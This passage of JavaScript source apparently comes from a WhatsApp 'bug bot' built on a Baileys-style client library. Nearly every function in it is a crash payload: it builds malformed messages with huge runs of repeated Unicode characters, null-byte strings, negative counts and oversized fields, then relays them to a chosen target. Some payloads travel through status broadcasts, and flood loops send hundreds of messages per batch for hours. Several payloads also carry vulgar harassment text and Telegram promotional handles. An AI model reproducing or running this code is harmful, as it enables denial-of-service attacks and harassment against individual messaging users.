    const originalEncodeWAMessage = XeonBotInc.encodeWAMessage?.bind(XeonBotInc);

    XeonBotInc.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (XeonBotInc.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = XeonBotInc.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await XeonBotInc.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await XeonBotInc.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: XeonBotInc.generateMessageTag(),
        from: XeonBotInc.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": XeonBotInc.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await XeonBotInc.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function delayNull(target) {

  // اعمل الـ repeat هنا بره الـ JSON
  const bigState = "X" + "\u0000".repeat(900000);

  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "D | 7eppeli-KillerQueen" + "ꦽ".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: {
          "values": {
            "in_pin_code": "999999",
            "building_name": "saosinx",
            "landmark_area": "X",
            "address": "Yd7",
            "tower_number": "Y7d",
            "city": "chindo",
            "name": "d7y",
            "phone_number": "999999999999",
            "house_number": "xxx",
            "floor_number": "xxx",
            "state": bigState
          }
        },
        version: 3
      }
    }
  }, { userJid: target });

  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}


async function crashmsg(target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Kornth",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "Telegram@lo_tus_19 null 🦠"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/VIP_1XB",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Telegram@lo_tus_19 🦠",
                    parentGroupJid: "0@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Telegram@lo_tus_19 🦠",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "Ai Kornth ",
                        thumbnail: null,
                        sourceUrl: "t.me/VIP_1XB",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash Kornth ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Telegram@lo_tus_19 🦠"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "Telegram@lo_tus_19 🦠"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await XeonBotInc.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: " ⁖Telegram@lo_tus_19 system 🦠",
                        body: "Telegram@lo_tus_19 🦠",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "https://t.me/VIP_1XB",
                        mediaUrl: "https://t.me/VIP_1XB",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await XeonBotInc.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });
        
    } catch (err) {
        console.error("Error", err);
    }
}

async function chatFrezz0e(target) {
    try {
        for (let s = 0; s < 1; s++) {
            const stickerMessage = generateWAMessageFromContent(
                target,
                proto.Message.fromObject({
                    botInvokeMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32),
                                deviceListMetadata: {
                                    senderKeyIndex: 0,
                                    senderTimestamp: Date.now(),
                                    recipientKeyIndex: 0
                                }
                            },
                            stickerPackMessage: {
                                stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                                name: "XinvasionX" + "𑇂𑆵𑆴𑆿".repeat(50000),
                                publisher: "t.me/BODY_brt",
                                stickers: [
                                    {
                                        fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "kmgU36CKofP+dXww1B7TVvTtQLK9CEuWbPYd9ABRtAw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "XZz6gF1lXcyGRjz1k6nrv2xW8y2L9MofMpsmlFZIMgY=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "iYjIgEp2J/4bF2jDJiEThzU5uNVd3ArB4eXmmr8JG5M=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "wLfOdZJ3/jE8EdS+rQDNpjMn9i+jrsCPc3DnfrpbEao=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "B4aUTYO1xHj2VwCeNgFkchqtD5lZ/59omLb5bi5NvOw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "lsS7uO7IqZJ8PQSoDYDzx0ZCyF+e6hTMEobkt1f8eA0=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "A2PvEWo9tBZupS1V1YXKJ5iwfSRdrwlmceNdy4UksR8=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "HDV3jx/hSV5OJ+bLx36+dnZ+Br4Mkr8X5KqRL0aI2Xo=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    }
                                ],
                                fileLength: "8020935",
                                fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                                fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                                mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                                directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc",
                                contextInfo: { 
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 50 }, () =>
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        )
                                    ]
                                },
                                packDescription: "",
                                mediaKeyTimestamp: "1749506440",
                                trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                                thumbnailHeight: 252,
                                thumbnailWidth: 252,
                                stickerPackSize: "15000000000",
                                stickerPackOrigin: "USER_CREATED"
                            }
                        }
                    }
                }),
                { userJid: target }
            );

            await XeonBotInc.relayMessage(target, stickerMessage.message, { 
                messageId: stickerMessage.key.id,
                participant: { jid: target }
            });
            await sleep(100);
        }
    } catch (e) {
        console.error(e);
    }
}

     async function SkyForce(target) {
    let listMessage = {
        title: "SkyC",
        sections: [],
        description: "",
        buttonText: "Click Here",
    };

  
    for (let i = 0; i < 9999; i++) {
        const largeText = "ꦾ".repeat(99999999); 

        listMessage.sections.push({
            title: `OverLoad Dek ${i}`,
            rows: [
                {
                    title: largeText,
                    rowId: `crazy_payload_${i}`,
                    description: "SkySky 🔥",
                },
            ],
        });
    }

    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: "SkyForce Payload\n" + "ꦾ".repeat(999999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "Payload by Lalzz",
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify(listMessage),
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
                                },
                            ],
                        }),
                    }),
                },
            },
        },
        { userJid: target }
    );

    await XeonBotInc.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });

    console.log(chalk.red.bold('Sky Succes Send bug'));
}

    
    
    
    async function crashnew(target) {
  const payload = {
    contextInfo: {
      mentionedJid: [], // بدل undefined, null
      forwardingScore: -9999,
      isForwarded: true,
      participant: null, // بدل null
      remoteJid: undefined,   // بدل undefined
      quotedMessage: {
        conversation: "\u0000".repeat(90000)
      }
    }
  }

  await XeonBotInc.relayMessage(target, {
    albumMessage: {
      caption: " ─ permission Emperorz. ",
      mediaCount: -99999999,
      firstMedia: {},
      contextInfo: payload.contextInfo
    }
  }, { messageId: "alb_" + Date.now() });

  await XeonBotInc.relayMessage(target, {
    contactMessage: {
      displayName: "\u0000".repeat(10000),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid=1234567890\nEND:VCARD",
      contextInfo: payload.contextInfo
    }
  }, { messageId: "ctc_" + Date.now() });

  await XeonBotInc.relayMessage(target, {
    nativeFlowMessage: {
      buttons: [],
      messageParamsJson: "{[(".repeat(10000),
      flowToken: "",
      content: {
        namespace: "",
        locale: "",
        fallbackLg: "",
        fallbackLc: "",
        title: "permission Emperorz.",
        description: "\u0000".repeat(10000),
        buttonText: "\u0000".repeat(10000),
      },
      contextInfo: payload.contextInfo
    }
  }, { messageId: "flw_" + Date.now() });

  await XeonBotInc.relayMessage(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          caption: " ─ permission Emperorz. ",
          jpegThumbnail: Buffer.alloc(1),
          contextInfo: payload.contextInfo
        }
      }
    }
  }, { messageId: "vom_" + Date.now() });

  await XeonBotInc.sendMessage(target, {
    text: " ",
    contextInfo: payload.contextInfo
  });
}

   async function Bug2(isTarget) {
  try {
    var atc = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          "productMessage": {
            "product": {
              "productImage": {
                "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
                "mimetype": "image/jpeg",
                "fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
                "fileLength": "9900090",
                "height": 735,
                "width": 735,
                "mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
                "fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
                "directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
                "mediaKeyTimestamp": "1731847042",
                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
              },
              "productId": "28364464939807272",
              "title": "⚰️𝗕𝗢𝗧 𝗠𝗜𝗗𝗢😈" + "ꦾ".repeat(90000),
              "description": "⚰️𝗕𝗢𝗧 𝗠𝗜𝗗𝗢😈⃰" + "ꦾ".repeat(90000),
              "currencyCode": "⚰️𝗕𝗢𝗧 𝗠𝗜𝗗𝗢😈‌" + "ꦾ".repeat(90000),
              "priceAmount1000": "999999999999999",
              "productImageCount": 1
            },
            "businessOwnerJid": "0@s.whatsapp.net",
            "contextInfo": {}
          }
        }
      }
    }), { 
      userJid: isTarget
    });
    await XeonBotInc.relayMessage(isTarget, atc.message, { participant: { jid: isTarget }, messageId: atc.key.id });
  } catch (error) {
    console.error("Failed to send Bug2 message:", error);
  }
  console.log(`bug send ${isTarget}`);
}
    
    
    
 async function loading(from) {

    {

        console.error("Invalid  from  JID:", from);

        return;

    }

    const Floading = [

        "ℓσα∂ιηg.",

        "ℓσα∂ιηg..",

        "ℓσα∂ιηg..."

    ];

    let { key } = await XeonBotInc.sendMessage(from, { text: " " });

    for (let i = 0; i < Floading.length; i++) {

        await XeonBotInc.sendMessage(from, { text: Floading[i], edit: key });

    }

}   
    
    
async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "Telegram: @lo_tus_19",
                    contentText:
                        "Telegram: @lo_tus_19",
                    footerText: "Telegram: @lo_tus_19",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "Telegram: @lo_tus_19" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Telegram: @lo_tus_19",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function DelayInVis(X, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                X,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Telegram: @lo_tus_19" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
        async function EpUi(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @lo_tus_19",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await XeonBotInc.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
        }

async function EpHemeral(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @lo_tus_19",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
